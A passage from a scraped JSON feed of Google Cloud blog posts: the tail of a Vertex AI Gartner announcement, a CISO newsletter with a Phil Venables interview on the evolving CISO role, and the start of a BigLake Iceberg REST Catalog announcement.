baseline;\"> enables developers to deploy, manage, and scale AI agents in production with a suite of fully managed services. These capabilities ensure agents can act reliably and efficiently across complex, existing business systems. With platforms like </span><a href=\"https://cloud.google.com/gemini-enterprise?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=1710046-Workspace-DR-NA-US-en-Google-BKWS-EXA-na&amp;utm_content=c-Hybrid+%7C+BKWS+-+EXA+%7C+Txt_Pollux-435278751514&amp;utm_term=gemini+enterprise&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=23071651391&amp;gclid=Cj0KCQiAq7HIBhDoARIsAOATDxAbipqKvtKspGxGJ-HZ4vCAJvgTjPoWd6PkiDCxgLQio1pdMbnw0QAaAgHgEALw_wcB&amp;e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, you can bring these production-ready agents directly to the entire knowledge workforce to streamline workflows and improve individual productivity.</span></p>\n<p><span style=\"vertical-align: baseline;\">To ensure agent development velocity, we offer the open-source </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK),</span></a><span style=\"vertical-align: baseline;\"> a flexible framework that has been downloaded over 8 million times to accelerate agent creation. We also continue to drive open standards for agent collaboration. We created and donated the </span><a href=\"https://google.github.io/adk-docs/a2a/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent2Agent (A2A)</span></a><span style=\"vertical-align: baseline;\"> protocol to the Linux Foundation, enabling secure communication across any vendor's agent ecosystem. We went a step further and delivered the </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/announcing-agents-to-payments-ap2-protocol?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Payments Protocol (AP2)</span></a><span style=\"vertical-align: baseline;\"> to power secure, trusted commerce between agents.</span></p>\n<p><span style=\"vertical-align: baseline;\">We are also constantly </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/more-ways-to-build-and-scale-ai-agents-with-vertex-ai-agent-builder?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">adding improvements</span></a><span style=\"vertical-align: baseline;\"> to mitigate operational risk. We provide native agent identities that integrate with your existing IAM policies, simplifying compliance audits and enforcing least-privilege access for every agent deployed. Features like Model Armor proactively inspect agent traffic to protect against common threats, including prompt injection and data exfiltration, ensuring operational stability.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Deploy AI at production scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A successful AI strategy requires reliable performance and predictable costs. Vertex AI is built on the same global infrastructure that runs Google Search and YouTube, giving your AI initiatives a foundation of resilience and scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">We offer flexible deployment options to meet your specific needs. For critical workloads, </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/provisioned-throughput/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Provisioned Throughput</span></a><span style=\"vertical-align: baseline;\"> offers a fixed-cost subscription that reserves capacity. This ensures consistent, predictable performance and eliminates resource contention.</span></p>\n<p><span style=\"vertical-align: baseline;\">Vertex AI uses pre-built connectors that drastically reduce the engineering effort needed to ground models in data from your on-premises data warehouses, multi-cloud environments, and SaaS applications, complementing secure connectivity to your Google Cloud data, including BigQuery. To ensure your data processing occurs within your defined sovereignty boundary, we support Data Residency Zones (DRZ) and offer Vertex AI on Google Distributed Cloud (GDC) for on-premises and edge deployments.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We believe Google Cloud’s recognition as a Leader in the Magic Quadrant underscores the strategic advantage Vertex AI offers in powering the agent economy today. We are committed to helping you build differentiated AI, operate it securely, and scale it reliably.</span></p>\n<p><a href=\"https://cloud.google.com/resources/content/2025-gartner-mq-cc-ai-application-development-platforms\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Download</span></a><span style=\"vertical-align: baseline;\"> a complimentary copy of the </span><strong style=\"vertical-align: baseline;\">2025 Gartner</strong><span style=\"vertical-align: baseline;\">®</span><strong style=\"vertical-align: baseline;\"> Magic Quadrant™ for AI Application Development Platforms</strong><span style=\"vertical-align: baseline;\"> report to learn more about why Google was recognized as a Leader.</span></p>\n<hr />\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">Gartner</span><span style=\"vertical-align: baseline;\">®</span><span style=\"font-style: italic; vertical-align: baseline;\"> Magic Quadrant</span><strong style=\"vertical-align: baseline;\">™</strong><span style=\"font-style: italic; vertical-align: baseline;\"> for AI Application Development Platforms  -  Jim Scheibmeir, Mike Fang, Cary Pillers, Steve Deng, November 17, 2025</span></sup></p>\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">Gartner does not endorse any vendor, product or service depicted in its research publications, and does not advise technology users to select only those vendors with the highest ratings or other designation. Gartner research publications consist of the opinions of Gartner's research organization and should not be construed as statements of fact. Gartner disclaims all warranties, expressed or implied, with respect to this research, including any warranties of merchantability or fitness for a particular purpose. This graphic was published by Gartner, Inc. as part of a larger research document and should be evaluated in the context of the entire document. The Gartner document is available upon request from Google. </span></sup></p>\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">GARTNER is a registered trademark and service mark of Gartner Inc., and/or its affiliates in the U.S and internationally, and MAGIC QUADRANT is a registered trademark of Gartner Inc., and/or its affiliates and are used herein with permission. All rights reserved.</span></sup></p></div>",
        "published_date": "2025-11-19 20:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-phil-venables-on-ciso-2-0-and-the-ciso-factory/",
        "title": "Cloud CISO Perspectives: Phil Venables on CISO 2.0 and the CISO factory",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Cloud_CISO_Perspectives_header_4_Blue.max-600x600.png",
        "author": "David Homovich",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>Welcome to the second Cloud CISO Perspectives for November 2025. Today, Phil Venables, Google Cloud’s current strategic security advisor and former CISO, and creator of this newsletter, shares his thoughts on how the role of the CISO is evolving in the AI era, and how organizations should shift their cybersecurity approach from fire stations to flywheels.</p><p>As with all Cloud CISO Perspectives, the contents of this newsletter are posted to the <a href=\"https://cloud.google.com/blog/products/identity-security/\">Google Cloud blog</a>. If you’re reading this on the website and you’d like to receive the email version, you can <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">subscribe here</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Get vital board insights with Google Cloud&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f1429866190&gt;), (&#x27;btn_text&#x27;, &#x27;Visit the hub&#x27;), (&#x27;href&#x27;, &#x27;https://cloud.google.com/solutions/security/board-of-directors?utm_source=cloud_sfdc&amp;utm_medium=email&amp;utm_campaign=FY24-Q2-global-PROD941-physicalevent-er-CEG_Boardroom_Summit&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3>Phil Venables on CISO 2.0 and the CISO factory</h3><p><i>By Alicja Cade, Senior Director, Financial Services, Office of the CISO, and David Homovich, Advocacy Lead, Office of the CISO</i></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Alicja Cade\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Alicja_Cade.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Alicja Cade, Senior Director, Financial Services, Office of the CISO</p></figcaption>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>Much has been said about the impact of AI on jobs, but one of the most crucial impacts AI is having in cybersecurity is on the role of the chief information security officer (CISO). AI is driving broad executive and board of director interest in security and governance in a way that hasn’t been seen before — and they’re turning to their CISOs for advice.</p><p>Phil Venables, Google Cloud’s current strategic security advisor and former CISO, explained why some CISOs are well-suited for their evolving role.</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"David Homovich\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/David_Homovich.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>David Homovich, Advocacy Lead, Office of the CISO</p></figcaption>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>“A common pattern of success for organizations that breed great security and other leaders is that the existing leaders pay attention to detail. They go deep occasionally. They validate things. They understand how the organization works. They understand how technology works. They understand how the business works,” he said during his keynote address at a Google Cloud CISO Community event in New York City earlier this month.</p><p>“They pay close attention to detail, and that promulgates the same sense of detail focus in the rest of their organization, that ultimately develops more and more leaders,” he said.</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-pull_quote\"><div class=\"uni-pull-quote h-c-page\">\n  <section class=\"h-c-grid\">\n    <div class=\"uni-pull-quote__wrapper h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n      <div class=\"uni-pull-quote__inner-wrapper h-c-copy h-c-copy\">\n        <q class=\"uni-pull-quote__text\">As their role evolves, CISOs should drive the evolution of their organization’s approach to cybersecurity from a fire station, reacting to disasters, to a flywheel, self- sustaining and continuously enhancing the business.</q>\n\n        \n      </div>\n    </div>\n  </section>\n</div>\n\n</div>\n<div class=\"block-paragraph\"><p>Organizations that encourage these behaviors, which Venables described as “CISO Factories” because they develop a disproportionate number of successful CISOs, aren’t magical. They share 12 common traits that can be replicated.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"CISO Factory slide\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/CISO_Factory_slide.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>The 12 common characteristics found at organizations that encourage and develop a culture of excellence.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>Through discussions at these CISO Community events and throughout the year, Google Cloud’s Office of the CISO has seen that the role of the CISO is widely varied and often misunderstood. Nevertheless, a successful security program is one of the highest-leverage contributions an individual can make to a modern enterprise, building resilience and durable trust with customers.</p><p>As their role evolves, CISOs should drive the evolution of their organization’s approach to cybersecurity from a fire station, reacting to disasters, to a flywheel, self-sustaining and continuously enhancing the business.</p><p><i>The following transcript has been lightly edited.</i></p><p><b>Alicja Cade</b>: After three decades as a CISO, can you share your thoughts on what it means to be a CISO in 2025?</p><p><b>Phil Venables</b>: I'm still connected quite deeply with the CISO community and the security community around the world. I've been spending more time observing and thinking about how the CISO role is changing — and it seems to be changing ever-quicker.</p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"Phil Venables, strategic security advisor, Google Cloud\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Phil_Venables_small.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Phil Venables, strategic security advisor, Google Cloud</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph\"><p>I've also spent a lot of time thinking about what it means to develop and build the next generation of security leaders. One of the things I'm seeing quite a lot is the CISO role going in many different directions. At many organizations, the CISO is in effect or actually becoming the chief technology officer, where CISOs are trying to push harder and harder for their organization to upgrade and enhance their technology.</p><p>In many cases, leadership and the boards are giving them the CTO responsibility, or the CISO is forming an ever closer partnership with the CTO or the head of infrastructure to massively upgrade their technology to be more inherently secure and defendable.</p><p>I think that's good progress.</p><p><b>Alicja Cade</b>: How is AI changing the role of the CISO?</p><p><b>Phil Venables</b>: Boards of directors want to know if what their company is doing with AI is safe and compliant, is it respecting privacy and all the trust and safety boundaries — and they’re turning to the CISO to talk about that.</p><p>Now, that's not all organizations. There are many large financial organizations that have got quite mature compliance and risk functions that are picking up their weight. But other organizations typically, especially those not necessarily in the historically very tightly regulated industries, the CISO is becoming almost like the chief digital risk officer. The CISO is being tasked with worrying about all of these other technology risks that are coming out as a result of AI.</p><p>AI’s not the only reason, but we're certainly seeing an evolution of the CISO role to be something what you might call kind of CISO version two, a much more evolved role.</p><p><b>David Homovich</b>: This leveling-up of the CISO is not exactly new, but the circumstances that are driving it have been changed by the AI era. How do you describe the current iteration of CISO 2.0?</p><p><b>Phil Venables</b>: The CISO is absolutely, undeniably becoming a peer business executive alongside all the other executives. How you secure and defend what most of our businesses are, as digital businesses, is becoming so critical that the CISO has to evolve.</p><p>The version two CISO mindset is really all about being business first. While we've talked about this for years, in many cases CISOs have been catching up with where the business wants to go and not leading the business where it needs to be. There are three pillars to CISO 2.0:</p><ol><li><b>CISOs should realize they’re peer business executives.</b> They don’t just follow business initiatives to make sure they're secure, but lead and educate the business on what opportunities may come about from the results of doing digitization in safe and secure ways.</li><li><b>CISOs need to be a peer technology leader and have technical empathy.</b> While the most successful CISOs are not primarily engineering leaders, they certainly have to be technically deep — or at least have an appreciation of technology and be able to work at a detailed level with the technology and engineering leaders and officers. CISOs should be able to suggest ways of engineering technology to help the organization create more secure by default, secure by design implementations.</li><li><b>CISOs need to be long-term players.</b> We all know many of the security activities and risk mitigation activities that we have to drive are things that just take years — even though we wish they would take quarters. This may be a little bit of selection bias, but the most successful CISOs are ones who manage to stay around for the longest time to see the results and drive the results of their change.</li></ol><p>I'm not oblivious to the fact that there's some organizations where people just have to go because they see the writing on the wall, that there's no way they can have as much effect. But we also have to be honest with ourselves. There's also plenty of cases where security leaders decide to go get the next job at the first point of resistance, as opposed to pushing through and realizing more long-term success.</p><p><b>Alicja Cade</b>: How do CISOs engage in a way that can build that long-term success?</p><p><b>Phil Venables</b>: When you look at the overall CISO 2.0 strategy, it's all about actually having a strategy. CISOs should really be brutal with themselves when they look at their strategy, and ask if their strategy is actually a strategy — or just a long-term plan that just has the word strategy written on the front.</p><p>Strategy is a theory of how to win for your organization, and it's distinct from plans. The plans come from the strategy, but strategy could be, for example, how we want the business to be able to pull help from the security team.</p><p>That’s a deliberate strategy that amplifies the engagement of the business. Then you plan, you go do things that are necessary, to create that pull.</p><p>Another example is that a big part of the strategy is encouraging transparency and accountability for risk, so that you get more self-correction in the environment. Then you’ve got to go do things to implement that strategy.</p><p><b>David Homovich</b>: The relationship between CISOs and their board of directors can often feel lacking. Can you talk about why boards and CISOs should be more important to each other?</p><p><b>Phil Venables</b>: We talk a lot about interactions with boards and with the board and what the board expects. One of the great common patterns of some of the best security organizations is they just aren’t good at interacting with the board. They haven’t given the board the right metrics, or they just don't figure out how to educate new board members.</p><p>It’s under the control of the CISO and the wider leadership team to educate the board, to build relationships with board members and equip the board with how to be an effective overseer of what the CISO needs to do. The good news is that when you actually speak to board members, they're eager to be educated. They want to be better board members to oversee security.</p><p>CISOs can influence board members, and boards can help influence business leaders. An example of this is when organizations more consciously use their buying power to drive the right behaviors in suppliers. Take a supplier that tells a customer that they’re the only company asking for a necessary security improvement that should be there by default, whereas in reality the supplier just wants to charge everybody for it.</p><p>It only takes a few companies of reasonable scale to actually call out the CEO of those companies to start triggering better behavior. It’s important that we think about all of our roles in the security and business community more broadly.</p><p><i>To stay on top of CISO Community events in 2026,</i> <a href=\"https://rsvp.withgoogle.com/events/google-cloud-ciso-community-interest-form-2026\" target=\"_blank\"><i>sign up now</i></a><i>.</i></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Fact of the month&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f14298661f0&gt;), (&#x27;btn_text&#x27;, &#x27;Learn more&#x27;), (&#x27;href&#x27;, &#x27;https://services.google.com/fh/files/misc/roi_of_ai_in_security_2025.pdf&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>In case you missed it</b></h3><p>Here are the latest updates, products, services, and resources from our security teams so far this month:</p><ul><li><b>How Google Does It: Network security in a nutshell</b>: At Google, we consider our fundamental network security perimeters to be state-of-the-art, in part because we rely on defense in depth. Here’s how we do it. <a href=\"https://cloud.google.com/transform/how-google-does-it-network-security-in-a-nutshell\"><b>Read more</b></a>.</li><li><b>How to build a best-practice Cyber Threat Intelligence program</b>: Many organizations struggle to operationalize CTI and translate it into actionable security outcomes. Check out these best-practice recommendations from Mandiant. <a href=\"https://cloud.google.com/transform/how-to-build-best-practice-cyber-threat-intelligence-program\"><b>Read more</b></a>.</li><li><b>Introducing the Emerging Threats Center in Google Security Operations</b>: To help organizations learn if they’ve been affected by vulnerabilities, we’re introducing the Emerging Threats Center in Google Security Operations. <a href=\"https://cloud.google.com/blog/products/identity-security/introducing-the-emerging-threats-center-in-google-security-operations\"><b>Read more</b></a>.</li><li><b>Supporting Viksit Bharat: Announcing AI investments in India</b>: We’re investing in powerful local tools in India to foster a diverse ecosystem and ensure our platform delivers controls for compliance and AI sovereignty. <a href=\"https://cloud.google.com/blog/products/gcp/supporting-viksit-bharat-announcing-ai-investments-in-india\"><b>Read more</b></a>.</li><li><b>Announcing the Google Unified Security Recommended program</b>: Introducing Google Unified Security Recommended, a new program that establishes strategic partnerships with market-leading security solutions. <a href=\"https://cloud.google.com/blog/products/identity-security/announcing-the-google-unified-security-recommended-program\"><b>Read more</b></a>.</li><li><b>Secure by design in the wild</b>: We’re announcing two new initiatives in pursuit of Secure by Design approach: Contributing to the Secure Web Application Guidelines Community Group in W3C, and introducing Auto-CSP in Angular. <a href=\"https://bughunters.google.com/blog/5457130561798144/effortless-web-security-secure-by-design-in-the-wild\" target=\"_blank\"><b>Read more</b></a>.</li><li><b>Supporting customers as a critical provider under EU DORA</b>: The ESA have officially designated Google Cloud EMEA Limited as a critical ICT third-party service provider under EU DORA. Here’s what that means for our European customers. <a href=\"https://cloud.google.com/blog/products/identity-security/supporting-customers-as-a-critical-provider-under-eu-dora\"><b>Read more</b></a>.</li></ul><p>Please visit the Google Cloud blog for more security stories <a href=\"https://cloud.google.com/blog/products/identity-security\">published this month</a>.</p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Join the Google Cloud CISO Community&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f14298662e0&gt;), (&#x27;btn_text&#x27;, &#x27;Learn more&#x27;), (&#x27;href&#x27;, &#x27;https://rsvp.withgoogle.com/events/ciso-community-interest?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=2024-cloud-ciso-newsletter-events-ref&amp;utm_content=-&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: GCAT-replacement-logo-A&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph\"><h3><b>Threat Intelligence news</b></h3><ul><li><b>Cybersecurity Forecast 2026</b>: Built on real-world trends and data, our forecasts come directly from Google Cloud security leaders, and dozens of experts, analysts, researchers, and responders directly on the frontlines. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/cybersecurity-forecast-2026\"><b>Read more</b></a><b>.</b></li><li><b>Frontline Bulletin: Unauthenticated remote access via Triofox vulnerability</b>: Mandiant Threat Defense has uncovered exploitation of an unauthenticated access vulnerability within Gladinet’s Triofox file-sharing and remote access platform. This now-patched n-day vulnerability allowed an attacker to bypass authentication and access the application configuration pages, enabling the upload and execution of arbitrary payloads. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/triofox-vulnerability-cve-2025-12480\"><b>Read more</b></a><b>.</b></li><li><b>Get going with Time Travel Debugging using a .NET process hollowing case study</b>: Unlike traditional live debugging, this technique captures a deterministic, shareable record of a program's execution. Here’s how to start incorporating TTD into your analysis. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/time-travel-debugging-using-net-process-hollowing\"><b>Read more</b></a><b>.</b></li><li><b>Analysis of UNC1549 targeting the aerospace and defense ecosystem</b>: Following last year’s post on suspected Iran-nexus espionage activity targeting the aerospace, aviation, and defense industries in the Middle East, we discuss additional tactics, techniques, and procedures (TTPs) observed in incidents Mandiant has responded to. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense\"><b>Read more</b></a><b>.</b></li></ul><p>Please visit the Google Cloud blog for more threat intelligence stories <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/\">published this month</a>.</p></div>\n<div class=\"block-paragraph\"><h3><b>Now hear this: Podcasts from Google Cloud</b></h3><ul><li><b>The agentic SOC meets reality: Governing AI agents and measuring success</b>: Moving from traditional SIEM to an agentic SOC model, especially at a heavily regulated insurer, is a massive undertaking. Allianz’s Alexander Pabst, deputy group CISO, and Lars Koenig, global head of detection and response, discuss data fidelity, the human in the loop, the risks of agentic AI, and more with hosts Anton Chuvakin and Tim Peacock. <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep252-the-agentic-soc-reality-governing-ai-agents-data-fidelity-and-measuring-success/\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Can AI red teams find truly novel attacks</b>: Ari Herbert-Voss, CEO, RunSybil, shares his perspective on building an agent that can discover novel attack paths with Anton and Tim. <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep251-beyond-fancy-scripts-can-ai-red-teaming-find-truly-novel-attacks/\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>The possible end of ‘collect everything’</b>: Balazs Scheidler, CEO, Axoflow, and founder of syslog-ng, explores how data pipelines can help us move from collecting all the data to getting access to security data — and what that means for the SOC, with Anton and Tim. <a href=\"https://cloud.withgoogle.com/cloudsecurity/podcast/ep250-the-end-of-collect-everything-moving-from-centralization-to-data-access/\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Defender’s Advantage: UNC5221 and the BRICKSTORM campaign</b>: Sarah Yoder, manager, Mandiant Consulting, and Ashley Pearson, senior analyst, Google Threat Intelligence Group, join host Luke McNamara to discuss UNC5221 and their operations involving BRICKSTORM backdoor. <a href=\"https://www.youtube.com/watch?v=JwZcPDOtg-s\" target=\"_blank\"><b>Listen here</b></a>.</li><li><b>Behind the Binary: Wrapping up FLARE-On 12 with the FLARE team</b>: Host Josh Stroschein is joined by Nick Harbour, Blas Kojusner, Moritz Raabe, and Sam Kim for a deep dive into the design and execution of FLARE-On 12. <a href=\"https://www.youtube.com/watch?v=qPwT_ZEsyq0\" target=\"_blank\"><b>Listen here</b></a>.</li></ul><p>To have our Cloud CISO Perspectives post delivered twice a month to your inbox, <a href=\"https://cloud.google.com/resources/google-cloud-ciso-newsletter-signup\">sign up for our newsletter</a>. We’ll be back in a few weeks with more security-related updates from Google Cloud.</p></div>",
        "published_date": "2025-11-19 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/biglake-metastore-now-supports-iceberg-rest-catalog/",
        "title": "Iceberg REST Catalog now supported in BigLake metastore (GA) for open data interoperability",
        "thumbnail": null,
        "author": "Pavan Edara",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, many organizations are moving towards lakehouse architectures to have a single copy of their data and use multiple engines for different workloads — without having to copy or move the data. However, managing a data lakehouse can be complex, often requiring custom pipelines that are hard to operate and that aren’t interoperable between query engines. Further, governance can be challenging when you have independent systems in multiple, local silos.</span></p>\n<p><span style=\"vertical-align: baseline;\">One way to succeed with a lakehouse architecture is to implement a metadata layer across your data engines. </span><span style=\"vertical-align: baseline;\">BigLake metastore is </span><span style=\"vertical-align: baseline;\">Google Cloud’s fully-managed, serverless, and scalable runtime metastore </span><span style=\"vertical-align: baseline;\">based on the industry-standard </span><a href=\"https://iceberg.apache.org/rest-catalog-spec/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Apache Iceberg REST Spec</span></a><span style=\"vertical-align: baseline;\">, providing a standard REST interface for wider compatibility and interoperability across OSS engines like Apache Spark, as well as Google Cloud native engines such as BigQuery. Today, we’re excited to announce that </span><span style=\"vertical-align: baseline;\">support for the </span><a href=\"https://docs.cloud.google.com/biglake/docs/blms-rest-catalog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Iceberg REST Catalog</span></a><span style=\"vertical-align: baseline;\"> is now generally available. </span></p>\n<p><span style=\"vertical-align: baseline;\">Now your users can query using their engine of choice across open-source engines such as Apache Spark and Trino, as well as native engines like BigQuery, all backed with the enterprise security offered by Google Cloud. </span><span style=\"vertical-align: baseline;\">For example, Spark users can utilize the BigLake metastore as a serverless Iceberg catalog to share the same copy of data with other engines, including BigQuery.</span><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">BigLake metastore also provides support for key authorization mechanisms such as credential vending, allowing users to access their tables without having direct access to the files in the underlying Google Cloud Storage bucket. </span><span style=\"vertical-align: baseline;\">Finally, BigLake metastore is integrated with Dataplex Universal Catalog so you get end-to-end governance complete with comprehensive lineage, data quality, and discoverability capabilities for BigLake Iceberg tables in BigQuery. </span><span style=\"vertical-align: baseline;\">Powered by Google's planet-scale metadata management infrastructure based on Spanner, BigLake metastore removes the need to manage custom metastore deployments, giving you </span><span style=\"vertical-align: baseline;\">the benefits of an open and flexible lakehouse with the performance and interoperability of an enterprise-grade managed service. </span></p>\n<p><span style=\"vertical-align: baseline;\">Leading organizations building their lakehouses with Google’s Data Cloud are already seeing the benefits of BigLake metastore.</span><span style=\"vertical-align: baseline;\"> </span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“Spotify is leveraging BigLake and BigLake metastore as part of our efforts to build a modern lakehouse platform. By utilizing open formats and open APIs, this platform provides an interoperable and abstracted storage interface for our data. BigLake helps us make our data accessible for processing by BigQuery, Dataflow and open-source, Iceberg-compatible engines.”</span><span style=\"vertical-align: baseline;\"> - Ed Byne, Product Manager, Spotify</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Simplify data management and unify governance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">BigLake metastore has a new UX console in which you can create and update your Iceberg Catalog. For easy access, the console lets you access all your Cloud Storage and BigQuery storage data across multiple runtimes, including BigQuery, and open-source, Iceberg-compatible engines such as Spark and Trino. For example, a data engineer can create Iceberg tables in Spark and the same data can be accessed by a data analyst in BigQuery. This gives you a single view of all of your Iceberg tables across Google Cloud, whether they’re managed by BigLake or self-managed in Cloud Storage. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_bLcuC8l.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Get started using the <a href=\"https://docs.cloud.google.com/biglake/docs/blms-rest-catalog#create_a_catalog\">Iceberg REST catalog</a></p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The BigLake UX console also lets you quickly create a catalog for your Iceberg data in Cloud Storage, rather than having to do it from the source. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_S6gymKH.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  